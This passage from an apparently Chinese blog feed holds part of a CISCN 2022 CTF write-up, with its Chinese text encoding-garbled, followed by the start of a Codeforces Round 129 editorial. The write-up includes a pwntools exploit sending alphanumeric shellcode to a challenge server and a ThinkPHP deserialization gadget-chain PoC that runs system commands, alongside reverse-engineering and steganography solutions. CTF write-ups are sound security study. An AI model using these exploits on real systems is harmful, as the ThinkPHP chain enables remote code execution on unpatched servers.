class="string">&#x27;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line"><span class="keyword">for</span> ch1 <span class="keyword">in</span> table:</span><br><span class="line">    <span class="keyword">for</span> ch2 <span class="keyword">in</span> table:</span><br><span class="line">        <span class="keyword">for</span> ch3 <span class="keyword">in</span> table:</span><br><span class="line">            <span class="keyword">for</span> ch4 <span class="keyword">in</span> table:</span><br><span class="line">                hashvalue=sha256((ch1+ch2+ch3+ch4+sss).encode()).hexdigest()</span><br><span class="line">                <span class="keyword">if</span> hashvalue==<span class="built_in">hash</span>:</span><br><span class="line">                    <span class="built_in">print</span>(ch1+ch2+ch3+ch4)</span><br><span class="line">                    quit()</span><br></pre></td></tr></table></figure><p>ç„¶åè¾“å…¥32ä¸ª0è¿‡ç¬¬äºŒæ­¥</p><p>è¿”å›ä¸€é•¿ä¸²å­—ç¬¦ä¸²</p><p>4993ad5ec5dfd5147003438c0e6afd696b026f48fb9676d625dbb6e2b1536b803c4d2e0a001b998f0d6afcb063e71fd8</p><p><img src="file:///C:/Users/XIA0JI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image002.jpg" alt="img">æ ¹æ®æç¤ºåˆ†æˆra,rb,k</p><p>ra=4993ad5ec5dfd5147003438c0e6afd69</p><p>rb=6b026f48fb9676d625dbb6e2b1536b80</p><p>K=3c4d2e0a001b998f0d6afcb063e71fd8</p><p>ç„¶åç»„åˆä¸€ä¸‹rb+raä¸º</p><p>6b026f48fb9676d625dbb6e2b1536b804993ad5ec5dfd5147003438c0e6afd69</p><p>æ‰“å…¥å‡ºflag</p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><p>æ¼æ´ç‚¹åœ¨é€‰é¡¹2ï¼Œé€‰é¡¹2ç”¨ <code>mmap</code> å¼€è¾Ÿäº†ä¸€ä¸ªå¯è¯»å¯å†™å¯æ‰§è¡Œçš„å†…å­˜ï¼Œå¹¶å¯ä»¥å¾€ä¸Šé¢å†™ä¸œè¥¿ï¼Œå¹¶ä¸”æ‰§è¡Œè¿‡å»ï¼Œé‚£ä¹ˆå°±ç¡®å®šè¦åœ¨ä¸Šé¢å†™ <code>shellcode</code>ï¼Œä½†æ˜¯ä¹‹å‰æœ‰ä¸‰ä¸ªcheckï¼Œåä¸¤ä¸ªç»è¿‡äº¤å‰å¼•ç”¨å¯çŸ¥åœ¨é€‰é¡¹ <code>1</code> ä¸­ç»™ <code>ro0t</code> å¯ä»¥å°†å®ƒç½®ä¸º1ï¼Œäºæ˜¯æˆ‘ä»¬å°±å…ˆç”¨é€‰é¡¹ <code>1</code> ç½®ä¸º1ï¼Œå†ç”¨é€‰é¡¹ <code>2</code> å»å†™ <code>shellcode</code>ï¼Œä½†æ˜¯æ¯ä¸ªå­—èŠ‚éƒ½æœ‰ <code>isprint</code> çš„ <code>check</code>ï¼Œé‚£å¥½åŠï¼Œå°±ç›´æ¥å†™ <code>alphanumeric shellcode</code>ã€‚</p><p>åœ¨ä¸‹é¢è¿™ä¸ªæ–‡ç« ä¸­æ‰¾åˆ°ç”¨çš„shellcode </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/Y_peak/article/details/115307573</span><br></pre></td></tr></table></figure><p>ç„¶åå†™å‡ºexp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#io=process(&#x27;./login&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;101.201.123.35&#x27;</span>,<span class="number">27290</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;opt:1\r\nmsg:ro0t\r\n&#x27;</span>)</span><br><span class="line">code = <span class="string">b&#x27;Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;opt:2\r\nmsg:&#x27;</span>+code+<span class="string">b&#x27;\r\n&#x27;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>TPçš„æ–°é“¾å­ï¼Œå…·ä½“æ¼æ´åˆ†æåœ¨è¿™ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.freebuf.com/vuls/321546.html</span><br></pre></td></tr></table></figure><p>ä¸‹å›¾å¯è§åœ¨/index.php/Index/test POSTä¼ åºåˆ—åŒ–å­—ç¬¦ä¸²ç»™aå³å¯</p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/1.png" alt="1"></p><p>POCåœ¨æ­¤ï¼Œlsä¸€ä¸‹å†è¯»ä¸‹flagå³å¯ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span>&#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">lazySave</span> = <span class="title">false</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$exists</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$table</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$withAttr</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$json</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$jsonAssoc</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span> = <span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;lazySave = <span class="literal">True</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data = [<span class="string">&#x27;whoami&#x27;</span> =&gt; [<span class="string">&#x27;ls&#x27;</span>]];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;exists = <span class="literal">True</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;table = <span class="variable">$obj</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;withAttr = [<span class="string">&#x27;whoami&#x27;</span> =&gt; [<span class="string">&#x27;system&#x27;</span>]];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;json = [<span class="string">&#x27;whoami&#x27;</span>,[<span class="string">&#x27;whoami&#x27;</span>]];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;jsonAssoc = <span class="literal">True</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">echo</span>(<span class="title">urlencode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>(<span class="title">new</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>()))));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="baby-tree"><a href="#baby-tree" class="headerlink" title="baby_tree"></a>baby_tree</h3><p>ç›´æ¥çœ‹astï¼Œassign_expræ˜¯èµ‹å€¼è¯­å¥ï¼Œbinary_expré‡Œé¢decl=åé¢æ˜¯è¿ç®—ç¬¦ï¼Œargument_listé‡Œçš„ä¸¤ä¸ªargumentå‚ä¸è¿ç®—ï¼Œåˆ†æä¸€ä¸‹ä¸»è¦é€»è¾‘ï¼Œå†™å‡ºå¯¹åº”çš„è§£å¯†è„šæœ¬ã€‚</p><p>è„šæœ¬ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> b[] = &#123;<span class="number">88</span>, <span class="number">35</span>, <span class="number">88</span>, <span class="number">225</span>, <span class="number">7</span>, <span class="number">201</span>, <span class="number">57</span>, <span class="number">94</span>, <span class="number">77</span>, <span class="number">56</span>, <span class="number">75</span>, <span class="number">168</span>, <span class="number">72</span>, <span class="number">218</span>, <span class="number">64</span>, <span class="number">91</span>, <span class="number">16</span>, <span class="number">101</span>, <span class="number">32</span>, <span class="number">207</span>, <span class="number">73</span>, <span class="number">130</span>, <span class="number">74</span>, <span class="number">128</span>, <span class="number">76</span>, <span class="number">201</span>, <span class="number">16</span>, <span class="number">248</span>, <span class="number">41</span>, <span class="number">205</span>, <span class="number">103</span>, <span class="number">84</span>, <span class="number">91</span>, <span class="number">99</span>, <span class="number">79</span>, <span class="number">202</span>, <span class="number">22</span>, <span class="number">131</span>, <span class="number">63</span>, <span class="number">255</span>, <span class="number">20</span>, <span class="number">16</span>&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> k[] = <span class="string">&quot;345y&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">42</span> - <span class="number">3</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp = k[<span class="number">0</span>];</span><br><span class="line">        k[<span class="number">0</span>] = k[<span class="number">1</span>];</span><br><span class="line">        k[<span class="number">1</span>] = k[<span class="number">2</span>];</span><br><span class="line">        k[<span class="number">2</span>] = k[<span class="number">3</span>];</span><br><span class="line">        k[<span class="number">3</span>] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">42</span> - <span class="number">4</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> r0 = b[i + <span class="number">0</span>], r1 = b[i + <span class="number">1</span>], r2 = b[i + <span class="number">2</span>], r3 = b[i + <span class="number">3</span>];</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp = k[<span class="number">3</span>];</span><br><span class="line">        k[<span class="number">3</span>] = k[<span class="number">2</span>];</span><br><span class="line">        k[<span class="number">2</span>] = k[<span class="number">1</span>];</span><br><span class="line">        k[<span class="number">1</span>] = k[<span class="number">0</span>];</span><br><span class="line">        k[<span class="number">0</span>] = tmp;</span><br><span class="line">        b[i + <span class="number">0</span>] = r2 ^ k[<span class="number">2</span>];</span><br><span class="line">        b[i + <span class="number">1</span>] = r3 ^ k[<span class="number">3</span>];</span><br><span class="line">        b[i + <span class="number">2</span>] = ((k[<span class="number">0</span>] + (b[i + <span class="number">0</span>] &gt;&gt; <span class="number">4</span>)) &amp; <span class="number">0xff</span>) ^ r0;</span><br><span class="line">        b[i + <span class="number">3</span>] = ((k[<span class="number">1</span>] + (b[i + <span class="number">1</span>] &gt;&gt; <span class="number">2</span>)) &amp; <span class="number">0xff</span>) ^ r1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">42</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">putchar</span>(b[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œä¸Šé¢çš„ç¨‹åºæ‹¿åˆ°flag</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="everlasting-night"><a href="#everlasting-night" class="headerlink" title="everlasting_night"></a>everlasting_night</h3><p>æœ¬æ¥ä»¥ä¸ºä¸æ˜¯lsbéšå†™ï¼ˆå› ä¸ºéšè—å­—æ¯å¤ªå°å¤ªçŠ„è§’æ—®æ—¯äº†æ²¡çœ‹è§ï¼‰ï¼ŒæŸ¥çœ‹å±æ€§æ— ä¿¡æ¯è·å–</p><p>æ‹‰å…¥010editorä¸­æŸ¥çœ‹pngçš„æ–‡ä»¶å¤´å’Œæ–‡ä»¶å°¾ï¼Œå‘ç°æ–‡ä»¶å°¾åé¢æœ‰ä¸€æ®µå¤šå‡ºæ¥çš„å­—ç¬¦ï¼Œä¸çŸ¥é“æ˜¯åšä»€ä¹ˆçš„ï¼Œå…ˆæ”¾ç€</p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/1653813046204.png" alt="1653813046204"></p><p>é¢˜ç›®æç¤ºå«lsbéšå†™åï¼Œæ‹‰å…¥StegsolveæŸ¥çœ‹ï¼Œç»ˆäºåœ¨Alpha2å¤„å‘ç°å³ä¸‹è§’æœ‰çŒ«è…»</p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/1653821873989.png" alt="1653821873989"></p><p>ä½†æ˜¯åˆ†æå¹¶æ²¡æœ‰å¾—å‡ºä¿¡æ¯ï¼Œåšä¿¡ä¿¡æ¯å°±éšè—åœ¨è¿™é‡Œï¼ŒæŸ¥é˜…å­—å…¸å‘ç°rowè¯‘ä¸ºä¸­æ–‡æ˜¯è¡Œï¼Œcolumnæ˜¯æŸ±ï¼ŒçŒœæµ‹å¯èƒ½æ˜¯å› ä¸ºå³ä¸‹è§’çš„ä¿¡æ¯æ˜¯ä¸€åˆ—çš„ï¼Œè€Œæˆ‘åˆšå¼€å§‹æŸ¥çœ‹æ˜¯ä»¥è¡ŒæŸ¥çœ‹ï¼Œä¿®æ”¹æˆåŠŸæ•°æ®åå‘ç°éšè—æ–‡æœ¬</p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/1653813260877.png" alt="1653813260877"></p><p>æ‹¿åˆ°è¿™ä¸²æ•°å­—åç¬¬ä¸€ååº”ä½¿ç”¨lsbçš„å·¥å…·</p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/1653824152028.png" alt="1653824152028"></p><p>æ‹¿åˆ°ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œæ‹‰å…¥010æŸ¥çœ‹å‘ç°æ˜¯å‹ç¼©åŒ…æ–‡ä»¶å¤´ï¼Œæœæ–­ä¿®æ”¹åç¼€åä¸ºrar</p><p>ä½†æ˜¯è§£å‹éœ€è¦å¯†ç ï¼ŒçŒœæµ‹å¼€å¤´åœ¨æ–‡ä»¶å°¾åçš„é‚£ä¸€ä¸²æ˜¯å¯†ç ï¼Œä½†æ˜¯è¾“å…¥åå‘ç°ä¸æ˜¯ï¼ŒçŒœæµ‹å¯èƒ½æ˜¯æŸç§åŠ å¯†ï¼Œå¹¿æ³›å°è¯•åå‘ç°æ˜¯md5éšå†™</p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/1653817094602.png" alt="1653817094602">è§£å‹åå¾—åˆ°ä¸€ä¸ªæ²¡æœ‰åç¼€çš„flagæ–‡ä»¶</p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/1653822607451.png" alt="1653822607451"></p><p>æ‹‰å…¥010å‘ç°æ˜¯PNGæ–‡ä»¶ï¼Œæœ¬æ¥æƒ³é€šè¿‡æ”¹åç¼€åæ‹¿åˆ°ç­”æ¡ˆï¼Œåæ¥å‘ç°è¿˜æ˜¯å¤ªå¤©çœŸ</p><p>ä½¿ç”¨pså’Œç”»å›¾æ‰“å¼€æ— æœï¼Œæƒ³åˆ°gimpï¼Œå°†æ–‡ä»¶åç¼€åæ”¹ä¸ºdataåç”¨gimpæ‰“å¼€</p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/1653824657534.png" alt="1653824657534"></p><p>å‘ç°å›¾ç‰‡æœ‰äº›æ€ªæ€ªçš„ï¼Œæœ¬æ¥æƒ³æ‹¼å›¾æ‰¾ä¸€ä¸‹flagï¼Œä½†æ˜¯å®åœ¨è€ƒéªŒçœ¼åŠ›ï¼Œäºæ˜¯å°è¯•ä¿®æ”¹å„ç§æ•°å€¼ï¼Œå‘ç°çŒ«è…»å‡ºåœ¨å®½åº¦ä¸Š</p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/1653824747017.png" alt="1653824747017"></p><p>æ‹¿åˆ°ç­”æ¡ˆï¼Œæäº¤</p><h3 id="ez-usb"><a href="#ez-usb" class="headerlink" title="ez_usb"></a>ez_usb</h3><p>ä½¿ç”¨ wireshark æ‰“å¼€å‘ç°æ˜¯ usb é”®ç›˜æµé‡</p><p>æœ‰ä¸¤ä¸ªä¸åŒçš„ usb.addr å‘é€æ•°æ®ï¼Œåˆ†åˆ«å°†å…¶ä¿å­˜åˆ°ä¸¤ä¸ªä¸åŒçš„æµé‡åŒ…</p><p>ç”¨é”®ç›˜æµé‡åˆ†æå·¥å…·å¯¹å…¶æå–æ•°æ®ï¼š<a href="https://github.com/WangYihang/UsbKeyboardDataHacker">https://github.com/WangYihang/UsbKeyboardDataHacker</a></p><p>å‘ç°æœ‰ä¸€ä¸ª <code>rar</code> æ–‡ä»¶ï¼Œä¸€ä¸ª <code>35c535765e50074a</code>ï¼Œæ‰“å¼€raræ–‡ä»¶å‘ç°éœ€è¦å¯†ç ï¼Œåº”è¯¥å¦ä¸€ä¸²å­—ç¬¦å°±æ˜¯å¯†ç ï¼Œè¾“å…¥æˆåŠŸæ‹¿åˆ° <code>flag</code> æ–‡ä»¶</p><h3 id="é—®å·è°ƒæŸ¥"><a href="#é—®å·è°ƒæŸ¥" class="headerlink" title="é—®å·è°ƒæŸ¥"></a>é—®å·è°ƒæŸ¥</h3><p>å¡«ä¸ªé—®å·è€Œå·²</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;å’•äº†æœ‰ç‚¹ä¹…äº†ï¼Œæ¥å‘ä¸€ä¸‹&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="CISCN" scheme="http://example.com/categories/CTF/CISCN/"/>
    
    <category term="2022" scheme="http://example.com/categories/CTF/CISCN/2022/"/>
    
    
  </entry>
  
  <entry>
    <title>Educational Coeforces Round 129(Div.2)é¢˜è§£</title>
    <link href="http://example.com/2022/05/24/Educational%20Codeforces%20Round%20129(Div.2)/"/>
    <id>http://example.com/2022/05/24/Educational%20Codeforces%20Round%20129(Div.2)/</id>
    <published>2022-05-24T14:00:00.000Z</published>
    <updated>2022-07-09T00:57:06.418Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™æ³¢ <code>div2</code> ä¸Šå¤§åˆ†ï¼Œå†™æ³¢é¢˜è§£ã€‚</p><p>å®å†µå½•å±<a href="https://www.bilibili.com/video/BV1RS4y1B7g3">åœ¨è¿™</a></p><span id="more"></span><h2 id="A-Game-with-Cards"><a href="#A-Game-with-Cards" class="headerlink" title="A. Game with Cards"></a>A. Game with Cards</h2><h3 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/05/24/Educational%20Codeforces%20Round%20129(Div.2)/1.png" alt="1"></p><h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>é¢˜ç›®çš„æ„æ€å°±æ˜¯è¯´ï¼Œ<code>Alice</code> å’Œ <code>Bob</code> åˆ†åˆ«æœ‰ <code>n,m</code> å¼ ç‰Œï¼Œç„¶åæ¯æ¬¡å‡ºç‰Œä¸èƒ½å°äºç­‰äºä¸Šä¸€æ¬¡çš„å‡ºç‰Œï¼Œå¦‚æœåˆ°è‡ªå·±çš„å›åˆå´ä¸èƒ½å‡ºç‰Œåˆ™åˆ¤è´Ÿï¼Œé—®å¦‚æœä¸¤äººåˆ†åˆ«å…ˆæ‰‹ï¼Œè°ä¼šèµ¢ï¼Ÿè¿™ä¸ªç¨å¾®æƒ³ä¸€ä¸‹å°±èƒ½å‘ç°æˆ‘ä¸€å¼€å§‹å‡ºæœ€å¤§çš„ä¸€å®šæ˜¯æœ€ä¼˜çš„ç­–ç•¥ï¼Œæ¯”çš„å°±æ˜¯æœ€å¤§å€¼è°æœ€å¤§ï¼Œå‡è®¾ç›¸ç­‰é‚£æˆ‘è‚¯å®šå‡ºæœ€å¤§çš„é‚£ä¸ªæˆ‘å¿…èµ¢ï¼Œæ‰€ä»¥æ— è„‘æ¯”æœ€å¤§å°±æ˜¯è¿™é¢˜çš„æ€è·¯ï¼Œå¦‚æœç›¸ç­‰é‚£ä¹ˆè°å…ˆæ‰‹è°èµ¢ï¼Œæ‰€ä»¥è¿™é‡Œå°±åˆ†ä¸‰ç§æƒ…å†µï¼š</p><ol><li><code>max1&gt;max2</code>ï¼š<code>Alice</code>å¿…èµ¢</li><li><code>max1&lt;max2</code>ï¼š<code>Bob</code>å¿…èµ¢</li><li><code>max1==max2</code>ï¼šè°å…ˆæ‰‹è°èµ¢</li></ol><h3 id="æ ‡ç¨‹"><a href="#æ ‡ç¨‹" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,x;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">int</span> max1=<span class="number">0</span>,max2=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">        max1=<span class="built_in">max</span>(max1,x);</span><br><span class="line">    &#125;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">        max2=<span class="built_in">max</span>(max2,x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(max1&gt;max2)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Alice\nAlice&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(max1&lt;max2)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Bob\nBob&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Alice\nBob&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Card-Trick"><a href="#B-Card-Trick" class="headerlink" title="B. Card Trick"></a>B. Card Trick</h2><h3 id="é¢˜ç›®æè¿°-1"><a href="#é¢˜ç›®æè¿°-1" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/05/24/Educational%20Codeforces%20Round%20129(Div.2)/2.png" alt="2"></p><h3 id="é¢˜ç›®åˆ†æ-1"><a href="#é¢˜ç›®åˆ†æ-1" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>ä¸€ä¸ªä»¥å‰ç»å¸¸ç©çš„é­”æœ¯ï¼Œå°±æ˜¯å‡è£…æ´—ç‰Œï¼Œå®åˆ™é‚£å¼ ç‰Œåœ¨å“ªé‡Œè®°å¾—æ¸…æ¸…æ¥šæ¥šã€‚ç»™ä¸€ä¸ªåºåˆ—ï¼Œæ¯æ¬¡æ“ä½œä¼šæŠŠå‰ <code>k</code> ä¸ªå€¼ç§»åŠ¨åˆ°æœ€åå»ã€‚é—®ç»è¿‡è‹¥å¹²æ¬¡æ“ä½œä¹‹åç¬¬ä¸€ä¸ªç‰Œçš„å€¼æ˜¯å¤šå°‘ï¼Œä¸éš¾å‘ç°å¦‚æœè¿›è¡Œä¸€æ¬¡æ“ä½œç›¸å½“äºç¬¬ <code>k+1</code> å¼ ç‰Œä¼šå˜æˆç¬¬ä¸€å¼ ç‰Œï¼Œå› ä¸ºæ˜¯ç›´æ¥ç§»åŠ¨ï¼Œä¸æ”¹å˜é¡ºåºï¼Œæ‰€ä»¥ä¸éš¾æƒ³åˆ°æ”¹é¢˜ç›®å°±æ˜¯ç»Ÿè®¡æ‰€æœ‰çš„æ“ä½œæ¬¡æ•°æœ€åå¯¹ <code>n</code> 